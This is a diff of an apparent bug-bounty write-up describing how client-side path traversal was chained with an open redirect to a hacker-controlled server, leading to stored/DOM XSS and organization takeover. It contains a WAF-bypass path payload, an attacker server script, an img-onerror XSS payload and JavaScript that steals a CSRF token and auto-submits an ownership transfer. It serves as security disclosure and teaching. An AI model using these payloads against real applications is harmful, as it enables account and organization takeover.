@@ -1,49 +1,59 @@
-# 1-click oraganiztion takeover chaining a cspt with open redirect
+# 1-Click Organization Takeover: Chaining CSPT with Open Redirect
 
-cspt is very common among bug bounty programs, although most of the times you can't report it alone, you can chain it with other types of bugs to achive a higher impact. 
+CSPT (Client-Side Path Traversal) is very common among bug bounty programs. Although most of the time you can't report it alone, you can chain it with other types of bugs to achieve a higher impact.
 
-## finding the cspt:
+## Finding the CSPT
 
-for finding cspts i always use the amazing [geko]() extension by [bu4factor](),while using the application i identified and verfied a cspt bug inside the path:
+For finding CSPTs, I always use the amazing [Geko](https://chromewebstore.google.com/detail/gecko/mngjkdkdahjibopfhpmnhidknebhfldn?pli=1) extension by [busf4ctor](https://x.com/busf4ctor?lang=en). While using the application, I identified and verified a CSPT bug inside the path:
 
-`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394`
-
-so i tried:
-
-`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394%2f..%2fcspt`
-
-but i was blocked by the waf, so i tried using %5c:
-
-`https://target.com/docs/1e64dfa4-bee3-4edb-9547-817d3b3cc394%5c..%5ccspt`
-
-and it worked!!
+`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee`
 
 
-## finding the open redirect:
+So I tried:
 
-one of the application functionalities allows you to integrate third party websites, and for this docs integeration it asks you to add the tenant name(directly apended to the third party tenants domain) then authenticate to the tenant. 
+`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee%2f..%2fcspt`
 
-![image](../image.png)
+But I was blocked by the WAF. I tried using `%5c` (backslash) instead:
 
-so in the tenant name i tried adding special characters like (/ ? " ') and the application accepted it! i tried testing for other types of bugs like xss and ssrf but noting worked but i found that i can do this.
+`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee%5c..%5ccspt`
 
-![image](../image%20copy.png)
+And it worked!
 
-like that i can add my own domain as a tenant! in the next step for adding the integeration the application asks you to verify authentication, clicking of verfiy the authentication button redirects you to your tenant in this case it redirect to my own website!! the open redirect endpoints looked something like this:
+## Finding the Open Redirect
 
-`https://target.com/authenticate/intgeration/verify`
+One of the application functionalities allows you to integrate third-party websites. it asks you to add the **Tenant Name** (directly appended to the third-party tenant's domain) and then authenticate to the tenant.
 
-## the first issue: javascript Type error
+![image](../images/image.png)
 
-after finding the open redirect i can now control the response of the webpage with the cspt to come from my own server, fortunatly the original response contained a json object that controls the whole webpage content.but the application uses vue js so direct xss won't work here, so i copied the original json response hosted it in my own server and played with it, but nothing showed i check the console and found this error:
+In the tenant name field, I tried adding special characters like (`/ ? " '`) and the application accepted it! I tried testing for other types of bugs like XSS and SSRF, but nothing worked. However, I found that I could manipulate the path.
 
-![image](../image%20copy%202.png)
+![image](../images/image%20copy.png)
 
-debuging using  the dev tools it turned out that this piece of code broke because of my json reponse and expects it to be an array, after investigation it turns out that the cspt manipulated another request that should return an array but now its returning my json object instead. 
+Like that, I can add my own domain(plus path) as a tenant! In the next step for adding the integration,I tried adding `https://hacker.com/exploit?`and it worked adding the rest of the domain name to url query. after that the application asks you to verify authentication. Clicking the verify authentication button redirects you to your tenant in this case, it redirects to my own website!! The open redirect endpoint looked something like this:
 
-so to solve this issue i realized that my cspt affected three different requests made by same page, two of them expects a json object and they where different but i can nest all the data needed to make the code work inside one object. and the third one expects an array. so i programed my server to responed with a json obect for the first two requests to this endpoint and in the third request it should respond with an empty array. here is the code i used:
+`https://target.com/authenticate/integration/verify`
 
-```
+visiting this endpoint will redirect the user to `https://hacker.com/exploit?`
+
+the full exploit url:
+
+`https://target.com/docs/..%5c..%5c..%5c..%5cauthenticate/integeration/verify` the application tries to fetch `https://hacker.com/exploit`.
+
+## The First Issue: JavaScript Type Error
+
+After finding the open redirect, I could now control the response of the webpage with the CSPT to come from my own server. Fortunately, the original response contained a JSON object that controls the whole webpage content. However, the application uses Vue.js, so direct XSS won't work here.
+
+I copied the original JSON response, hosted it on my own server, and played with it, but nothing showed up. I checked the console and found this error:
+
+![image](../images/image%20copy%202.png)
+
+Debugging using the dev tools, it turned out that this piece of code broke because of my JSON response. It expects an Array, but after investigation, it turned out that the CSPT manipulated another request that should return an Array, but now it is returning my JSON object instead.
+
+To solve this issue, I realized that my CSPT affected **three different requests** made by the same page: two of them expect a JSON object (and they were different, but I can nest all the data needed inside one object), and the third one expects an Array.
+
+So, I programmed my server to respond with a JSON object for the first two requests to this endpoint, and for the third request, it responds with an empty array. Here is the code I used:
+
+```javascript
 let hitcount = 0;
 app.get('/exploit.json', (req, res) => {
         hitcount++
@@ -62,10 +72,11 @@ app.get('/exploit.json', (req, res) => {
 });
 ```
 
-
 ## the second issue finding XSS sink
 
-to give you a background the page with the cspt is a page where the user can set multiple types of questions checkbox, text fields, yes or now, etc..., injecting into these fields didn't excute any JS, so i looked again inside the application to see what other questions types i add to the page, and while reading the questions types and their description i found that one of them allows for adding rich text, the question description was as fallows:
+To give you some background, the page with the CSPT is a page where the user can set multiple types of questions (checkbox, text fields, yes or no, etc.). Injecting into these fields didn't execute any JS, so I looked again inside the application to see what other question types I could add to the page.
+
+While reading the question types and their descriptions, I found that one of them allows for adding Rich Text. The question description was as follows:
 
 ```
                 {
@@ -80,15 +91,16 @@ to give you a background the page with the cspt is a page where the user can set
                 }
 ```
 
-so i copied the question json, and injected `<img src=x onerror=alert(document.domain)>` in the question answer field and poped the XSS!!
+So I copied the question JSON and injected `<img src=x onerror=alert(document.domain)>` in the question answer field and popped the XSS!!
 
-![image](../image%20copy%203.png)
+![image](../images/image%20copy%203.png)
 
 
 ## Escaltion To organization takeover
 
-at this point i have a XSS with the same organization requiring admin privelages(only admins can edit integerations settings), with the session cookies beings http only, i tried self XSS esclatoin techniques but it didn't work as i didn't have a logout csrf, so the only impact i could find is to steal the csrf token and take ownership of the organization, this is the exploit code:
+t this point, I have a Dom Based XSS with the same organization requiring admin privileges (only admins can edit integration settings). With the session cookies being HttpOnly, I tried self-XSS escalation techniques, but it didn't work as I didn't have a logout CSRF.
 
+The only impact I could find was to steal the CSRF token and take ownership of the organization. This is the exploit code:
 ```
 let hackerid = 12345;
 let myform = document.createElement('form');
@@ -107,6 +119,15 @@ myform.appendChild(input);
 document.body.appendChild(myform); myform.submit();
 ```
 
-the exploit create a form and two input element, then steals the csrf token via `document.querySelector('input[name=csrftoken]').value;` and stores it in the input.value and the second element contains the hacerid, then javascript auto submit the form and transfers ownership to the hacker.
+The exploit creates a form with two input elements, then steals the CSRF token via` document.querySelector` and stores it in the input value. The second element contains the hackerid. Then JavaScript auto-submits the form and transfers ownership to the hacker.
 
+here is a high level overview of the expolit steps:
+
+![image](../images/image%20copy%204.png)
+## More Stuff to Read About CSPT: 
+
+- https://vitorfalcao.com/posts/hacking-high-profile-targets/
+- https://matanber.com/blog/cspt-levels
+- https://blog.doyensec.com/2025/03/27/cspt-resources.html
+- https://x.com/xssdoctor/status/1961157661048578402?s=20
 
